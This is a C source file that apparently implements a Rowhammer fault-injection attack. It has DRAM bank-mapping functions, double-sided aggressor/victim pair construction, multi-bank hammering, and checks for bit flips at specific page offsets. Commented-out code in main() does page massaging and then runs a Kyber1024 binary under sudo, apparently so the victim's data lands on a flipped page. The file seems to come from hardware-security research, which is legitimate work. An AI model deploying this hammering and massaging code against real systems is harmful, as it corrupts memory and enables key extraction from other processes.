#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/types.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

#include <stdio.h>
#include <stdint.h>
#include <sys/statvfs.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>
#include <stdbool.h>
#include <assert.h>
#include <time.h>

#include <pthread.h>
#include <errno.h>
#include <math.h>
#include <sys/sysinfo.h>

#include <sched.h>

#include "rowhammer_utils.h"

#define PAGE_SIZE (1<<12)
#define E_OFFSET 0x0180



#define POSIX_ALIGN (1<<22)
#define MEM_SIZE (1<<21)
#define HUGE_SIZE (1<<21)

#define HASH_FN_CNT 4
#define ROW_SIZE 		(1<<13)

typedef struct {
	uint64_t lst[HASH_FN_CNT];
	uint64_t len;
}AddrFns;

typedef struct {
	AddrFns h_fns;
	uint64_t row_mask;
	uint64_t col_mask;
}DRAMLayout;


typedef struct{
    uint64_t num_conf;
    char** conflicts;
}contig_rows;

typedef struct {
   char* base;
   contig_rows* bank_contig_rows; // array of conflict array (e.g. conflict_bank[0] is an array of all the addresses that conflict in bank 0. Each 4 addresses in that row will belong to a single row)
   uint64_t virt_offset; // the virtual addr offset from eg. a virtual address that thas 21 trailing zeroes has a virtual offset of 0. Helps with virt2dram but not abs necessary
}contig_chunk;

typedef struct{
    char* aggressors[8];
    char* victims[4];
}ds_pair; // this struct will hold all the relevant base addresses for a double-sided hammer

typedef struct{
    ds_pair* pairs[16];
    int num_pairs[16]; 
}bank_pairs;

bank_pairs bank_pairs_arr;

DRAMLayout      g_mem_layout = {{{0x2040,0x24000,0x48000,0x90000}, 4}, 0x3fffe0000, ROW_SIZE-1};






size_t mem_size;
char* memory;
double fraction_of_physical_memory = 0.2;

// Obtain the size of the physical memory of the system.
uint64_t GetPhysicalMemorySize() {
    struct sysinfo info;
    sysinfo(&info);
    return (size_t) info.totalram * (size_t) info.mem_unit;
}

//Allocate large chunk of memory for finding correct pages
void setupMapping() {
    mem_size = (size_t) (((GetPhysicalMemorySize()) *
                          fraction_of_physical_memory));


    memory = (char *) mmap(NULL, mem_size, PROT_READ | PROT_WRITE,
                           MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

    assert(memory != MAP_FAILED);

    for(size_t i =0;i< mem_size; i+=0x1000){
	memory[i]=i+77;
    }
}



char** agg;
int prehammer_val=0;
char* tgt_page=0;

int num_blocks = 2;
// only works with 2MB aligned pages because the first 21 bits of the virtual addresses are identical to the first in phys
u_int64_t get_bank(uint64_t v_addr){
    
    uint64_t bank=0;
    for (int i = 0; i < g_mem_layout.h_fns.len; i++) {
		
		bank |= (__builtin_parityl(v_addr & g_mem_layout.h_fns.lst[i]) <<i);
	}
    return bank;
}

///thp code 
uint64_t get_dram_row_thp(uint64_t v_addr)
{
	uint64_t row_mask = (HUGE_SIZE -1) & g_mem_layout.row_mask;
	return (v_addr & row_mask) >> __builtin_ctzl(row_mask);
}

int alloc_buffer(contig_chunk* mem_chunks, int num_blocks)
{
	


	// madvise alloc
	for (int i = 0; i < num_blocks; i++) {
		posix_memalign((void **)(&(mem_chunks[i].base)), POSIX_ALIGN, MEM_SIZE);
        
        if (mem_chunks[i].base == NULL) {
		    fprintf(stderr, "not alloc\n");
	    }
		// fprintf(stderr, "iter %d: ", i);
		if (madvise(mem_chunks[i].base, POSIX_ALIGN, MADV_HUGEPAGE) == -1)
		{
			fprintf(stderr, "MADV %d Failed: %d\n", i, errno);
            
		}
		
        memset(mem_chunks[i].base,0xFF,MEM_SIZE);

        mem_chunks[i].virt_offset = ((uint64_t) mem_chunks[i].base) & (MEM_SIZE - 1);
	}

	return 0;

}



// finds all pages that row conflict with the base_page
void find_bank_conflict(contig_chunk* mem_chunk, int target_bank){

    // find a base address in the target bank
    
    u_int64_t base;
    u_int64_t curr;
    uint64_t phys;
    int ndx=0;
    for(int i=0; i< MEM_SIZE/PAGE_SIZE; i++){
        int found_base=0;
        for(int j=0; j<2; j++){
            base = (uint64_t)mem_chunk->base + i*PAGE_SIZE + 64*j;
            if(get_bank(base) == target_bank){
                // printf("Found base\n");
                found_base=1;
                break;
            }
        }
        if(found_base){break;}
    }
    mem_chunk->bank_contig_rows[target_bank].conflicts = (char**) malloc(sizeof(char*) * 300);
    
    

 
   
    // printf("starting row conflict\n");
    for(int i=0; i<MEM_SIZE/PAGE_SIZE; i++){
        for (int v=0; v< 2; v++){
            curr = (uint64_t) mem_chunk->base + (i*PAGE_SIZE) + 64*v;
            if(curr == base){continue;}
            
          
            
            if(get_bank(base) == get_bank(curr)){
                mem_chunk->bank_contig_rows[target_bank].conflicts[ndx] = (char*)curr;
                // printf("Get DRAM row: %lx\n",get_dram_row_thp((u_int64_t)curr));
                // printf("Get BANK: %lx\n",get_bank((u_int64_t)curr));
                ndx++;
            }
        }

        
        

    }
    
    // if(ndx < 100){printf("less than 100 found\n"); exit(0);}
    mem_chunk->bank_contig_rows[target_bank].num_conf =ndx;
    return ;
}

// takes in all the memory chunks and returns a pointer to a list of hammering pairs
// the list is to be used in templating
// so this function is just for organizing things
int create_hammer_pairs(contig_chunk* chunks, int target_bank, ds_pair* pairs_array){
    // ds_pair* pairs_array = (ds_pair*) malloc(200*sizeof(ds_pair));
    int pair_ndx=0;

    for(int i=0; i< num_blocks; i++){ // go through the conflict array of the target bank of each chunk. The conflict array is basically a list of contig memory rows
        if(chunks[i].bank_contig_rows[target_bank].num_conf < 12){continue;} // if the chunk doesn't have a full 3 rows for double sided, skip it
        int ndx=0;
        int agg_parity=0;
        while((ndx*4) <= chunks[i].bank_contig_rows[target_bank].num_conf  -4){
            if((ndx%2) == 0){
                // aggressors
                pairs_array[pair_ndx].aggressors[0 + 4*agg_parity] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4];
                pairs_array[pair_ndx].aggressors[1 + 4*agg_parity] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4+1];
                pairs_array[pair_ndx].aggressors[2 + 4*agg_parity] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4+2];
                pairs_array[pair_ndx].aggressors[3 + 4*agg_parity] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4+3];

                if(agg_parity == 1){
                    // completed an agg pair
                    pair_ndx++;
                }
                agg_parity = agg_parity ^ 1;

            }else{
                pairs_array[pair_ndx].victims[0] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4];
                pairs_array[pair_ndx].victims[1] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4+1];
                pairs_array[pair_ndx].victims[2] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4+2];
                pairs_array[pair_ndx].victims[3] = chunks[i].bank_contig_rows[target_bank].conflicts[ndx*4+3];
            }
            ndx++;
        }
        
    }
    
    return pair_ndx;
}

void fill_victims(ds_pair* pairs_array, int num_pairs){
    for(int i=0; i< num_pairs; i++){
        char* addr =  (char*) (((uint64_t)  pairs_array[i].victims[0])  &(~(PAGE_SIZE-1)) );
        char* addr2 = (char*) (((uint64_t)  pairs_array[i].victims[1])  &(~(PAGE_SIZE-1)) );
        char* addr3 = (char*) (((uint64_t)  pairs_array[i].victims[2])  &(~(PAGE_SIZE-1)) );
        char* addr4 = (char*) (((uint64_t)  pairs_array[i].victims[3])  &(~(PAGE_SIZE-1)) );
        memset(addr, 0x00, PAGE_SIZE);
        memset(addr2, 0x00, PAGE_SIZE);
        memset(addr3, 0x00, PAGE_SIZE);
        memset(addr4, 0x00, PAGE_SIZE);
        
        flush_chunck(addr,PAGE_SIZE);
        flush_chunck(addr2,PAGE_SIZE);
        flush_chunck(addr3,PAGE_SIZE);
        flush_chunck(addr4,PAGE_SIZE);
    }
    return;
}




int check_victims(ds_pair* pairs_array, int num_pairs){
    int flip_0 =0;
    int bad = 0;
    int num_flips =0;
    for(int i=0; i< num_pairs; i++){
        for(int j=0; j < 4; j++){
            char* addr = (char*) (((uint64_t) pairs_array[i].victims[j]) &(~(PAGE_SIZE-1)) );
            flip_0 = 0;
            bad = 0;
            num_flips=0;
            
            for(int n=0; n<PAGE_SIZE; n++){
                
                if( (uint8_t) addr[n] != 0x00 ){
                    
                    printf("FLIP in addr (%lx): %hhx\n",(u_int64_t)(addr + n), addr[n]);
                    num_flips++;
                    if(((n==2121) && ((uint8_t) addr[n] == 0x88))) {
                        printf("Got flip-0\n");
                        flip_0 = 1;
                        
                    }else if(((n==2121) && ((uint8_t) addr[n] == 0x08))){
                        printf("Got flip-0\n");
                        flip_0 = 1;
                    }else if(((n==2122) && ((uint8_t) addr[n] == 0xDE))){
                        printf("Got flip-0\n");
                        flip_0 = 1;
                    }else if(((n==2122) && ((uint8_t) addr[n] == 0xDB))){
                        printf("Got flip-0\n");
                        flip_0 = 1;
                    }else{bad=1;}
                }

            }
            if(num_flips > 0){
                    tgt_page = addr;
                    return 1;
            }

            if(flip_0 &(!bad)){
                tgt_page = addr;
                return 1;
            }
        }   
    }
    return 0;

}







int multi_bank(){
    char** agg_list = malloc(20*sizeof(char*));
   for(int bank1=0; bank1<16; bank1++){
       for(int bank2=(bank1+1); bank2<16; bank2++){
           int bank1_start=0;
           int bank2_start=0;
           int bank1_end=0;
           int bank2_end=0;
           int ndx=0;
           while((bank1_end < bank_pairs_arr.num_pairs[bank1]) &&  (bank2_end < bank_pairs_arr.num_pairs[bank2])){
            //    agg_list[ndx] = bank_pairs_arr.pairs[bank1][bank1_end].aggressors[0];
            //    agg_list[ndx+1] = bank_pairs_arr.pairs[bank1][bank1_end].aggressors[4];
            //    agg_list[ndx+2] = bank_pairs_arr.pairs[bank2][bank2_end].aggressors[0];
            //    agg_list[ndx+3] = bank_pairs_arr.pairs[bank2][bank2_end].aggressors[4];
               
               agg_list[ndx] = bank_pairs_arr.pairs[bank1][bank1_end].aggressors[0];
            //    agg_list[ndx+1] = bank_pairs_arr.pairs[bank1][bank1_end].aggressors[4];
                agg_list[ndx+1] = bank_pairs_arr.pairs[bank2][bank2_end].aggressors[0];
               agg_list[ndx+2] =  bank_pairs_arr.pairs[bank1][bank1_end].aggressors[4];
               agg_list[ndx+3] = bank_pairs_arr.pairs[bank2][bank2_end].aggressors[4];
               ndx+=4;
               bank1_end++;
               bank2_end++;
               if(ndx>=20){
                //    printf("%d  aggressors\n", ndx);
                //    for(int i=0; i<ndx; i++){
                       
                //        printf("Bank %ld:\n", get_bank((u_int64_t) agg_list[i]));
                //     }
                   // fill the victims
                   fill_victims(bank_pairs_arr.pairs[bank1], bank_pairs_arr.num_pairs[bank1]);
                   fill_victims(bank_pairs_arr.pairs[bank2], bank_pairs_arr.num_pairs[bank2]);
                   // hammer
                    int x =  hammer_thp_prehammer(agg_list, 0, 20);
                   // scan the victims
                   if(check_victims(bank_pairs_arr.pairs[bank1], bank_pairs_arr.num_pairs[bank1])){
                       agg=agg_list;
                       return 1;
                   }
                   if(check_victims(bank_pairs_arr.pairs[bank2], bank_pairs_arr.num_pairs[bank2])){
                       agg=agg_list;
                       return 1;
                   }
                   
                   
                  // reset
                  ndx=0;
                  bank1_end = bank1_start+3;
                  bank1_start+=3;
                  bank2_end = bank2_start+3;
                  bank2_start+=3;
               }

           }
       }
   }
   return 0;
}




void main(void){
   

    
    // for(int i=0; i<1000; i++){
    //     //     char* exhaust = (char *) mmap(NULL, dummy_num*PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE| MAP_POPULATE, -1, 0);
    //     // }
    // setupMapping();
    int mem_size = 100*PAGE_SIZE;
    char* mem_block_1;
    char* mem_block_2;
    for(int i=0; i< 8000; i++){
        mem_block_1 = (char *) mmap(NULL, mem_size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE| MAP_POPULATE, -1, 0);
        // mem_block_2 = (char *) mmap(NULL, mem_size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE| MAP_POPULATE, -1, 0);
    }

    if(check_consecutive((uint64_t) mem_block_1, mem_size)){
        printf("mem 1 is contig\n"); 
    }else{
        printf("mem 1 is not\n"); 
    }
    //  if(check_consecutive((uint64_t) mem_block_2, mem_size)){
    //     printf("mem 2 is contig\n"); 
    // }else{
    //     printf("mem 2 is not\n"); 
    // }


	
    // int num_calls=0;

    // do{
    //      mem_block_1 = (char *) mmap(NULL, mem_size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE| MAP_POPULATE, -1, 0);
    //      num_calls++;
    // }while(!check_consecutive((uint64_t) mem_block_1, mem_size));
    
    // printf("num calls %d\n", num_calls);

    // contig_chunk* chunks = malloc( num_blocks* sizeof(contig_chunk));
    
    // for(int i=0; i<num_blocks; i++){
    //     chunks[i].bank_contig_rows = malloc(16*sizeof(contig_rows));
    // }

    
    // /// madvise memory///////////////////////////////////////
    // int alloc = alloc_buffer(chunks, num_blocks);
    


    // // printf("Chunks...............\n");
    // // for(int i=0; i<num_blocks; i++){
    // //     printf("%d- (%lx, %lx)\n", i,  (uint64_t) chunks[i].base, get_physical_addr((uint64_t)chunks[i].base));
    // // }
    // // exit(0);
    // int dummy_num=400;
    // char* dummies;
    // for(int i=0; i<1; i++){
    //     dummies = (char *) mmap(NULL, dummy_num*PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE| MAP_POPULATE, -1, 0);
    // }
     

    // printf("dummies.......\n");
	// for(int i=0; i<dummy_num; i++){
	// 	printf("%d - %lx\n", i, get_physical_addr((uintptr_t) dummies+i*PAGE_SIZE));
	// }
    // ///////////////////////////////////
   

  

    // //////////////Templating///////////////////////////////////////////////////////////// 
    // // For every bank, for every chunk, create a list of contiguous rows 
    
    // int tries =0;

    // while(tries < 10){
    //     for(int j=0; j < 16; j++){
    //         ds_pair* pairs_array = (ds_pair*) malloc(400*sizeof(ds_pair));
            
    //         // printf("//////////////////////Conflict for Bank %d////////////////////////////\n", j);
    //         for(int i=0; i < num_blocks; i++){
    //             // printf("-------------Chunk %d------------------------\n", i);
    //             find_bank_conflict(&chunks[i], j);
    //         }
    //         // printf("//////////////////////Create Pairs.....................\n");
    //         int num_pairs = create_hammer_pairs(chunks, j, pairs_array); //create a list of double sided pairs
    //         bank_pairs_arr.pairs[j] = pairs_array;
    //         bank_pairs_arr.num_pairs[j] = num_pairs;
        
    //     }
    // // /////////////////////////////////////////////////////////////////////////////////////////// 

    //     if( (multi_bank())){
            
    //         // exit(0);
    //         break;
    //     }
    //     alloc = alloc_buffer(chunks, num_blocks);
    //     for(int i=0; i<num_blocks; i++){
    //         chunks[i].bank_contig_rows = malloc(16*sizeof(contig_rows));
    //     }
       
    //     tries++;
    // }
    // printf("Tgt: %lx\n", get_physical_addr((uint64_t) tgt_page));
    // // if(!tgt_page){
    // //     printf("no suitable flips....\n");
    // //     exit(0);
    // // }

    // printf("............................\n");
    // for(int i=0; i<num_blocks; i++){
    //     printf("%d- %lx\n", i, get_physical_addr((uintptr_t) chunks[i].base));
    // }


    // for(int i=0; i< num_blocks; i++){
    //     int m = madvise(chunks[i].base, PAGE_SIZE, MADV_PAGEOUT);
    // }

   
    // printf("proceed to massaging....\n");

    // // printf("chunk mem.......\n");
	// // for(int i=1; i<100; i++){
	// // 	printf("%d - %lx\n", i, get_physical_addr((uintptr_t) chunks[0].base+i*PAGE_SIZE));
	// // }
    
    // // hammering and maneuouvers
    // cpu_set_t  mask;
    // CPU_ZERO(&mask);
    // CPU_SET(2, &mask);
    // int r;


    // if(fork() == 0){
	// 	// printf("I am the child\n");
		
		
	// 	//  touch the target
        
	// 	memset(tgt_page, 0xFF, PAGE_SIZE);
        

	// 	for(int i=0; i< dummy_num; i++){
	// 		memset(dummies + i*PAGE_SIZE, 0xFF,1<<12);
	// 	}

		
        
        
	// 	uint64_t w=0;
	// 	// while(w<5000000){w++;}

	// 	while(1){
    //         if( w<70){
    //             // hammer(conflicts[aligned_ndx -2],conflicts[aligned_ndx+2],400000);
    //         }
            
			
			
	// 		w++;
	// 	}
		
			
	// }else{
	// 	usleep(4000);
    //     // move to a different physical core
    //     r = sched_setaffinity(getpid(),sizeof(mask),&mask);
		

    //     // for(int i=0; i<1000; i++){
    //     //     char* exhaust = (char *) mmap(NULL, dummy_num*PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE| MAP_POPULATE, -1, 0);
    //     // }
	// 	// for(int i=0; i< 80; i++){
	// 	// 	munmap(dummies + i*PAGE_SIZE, PAGE_SIZE);
	// 	// }   

    //      for(int i=1; i< 400; i++){
    //         munmap(chunks[0].base + i*PAGE_SIZE, PAGE_SIZE);
    //     }



	// 	// release the target
    //     // munmap(tgt_page, PAGE_SIZE);

    //     //   for(int i=0; i< num_blocks; i++){
    //     //     int m = madvise(chunks[i].base, MEM_SIZE, MADV_DONTNEED);
    //     // }

		
	// 	// release the dummies
	// 	// for(int i=0; i< dummy_num-80; i++){
	// 	// 	munmap(dummies + i*PAGE_SIZE, PAGE_SIZE);
	// 	// }

      
       
    //     // usleep(4000);

	// 	system("sudo taskset 0x4 ../../test_kyber1024 > kyber_out.txt");
		
		
		
	// }





    
}
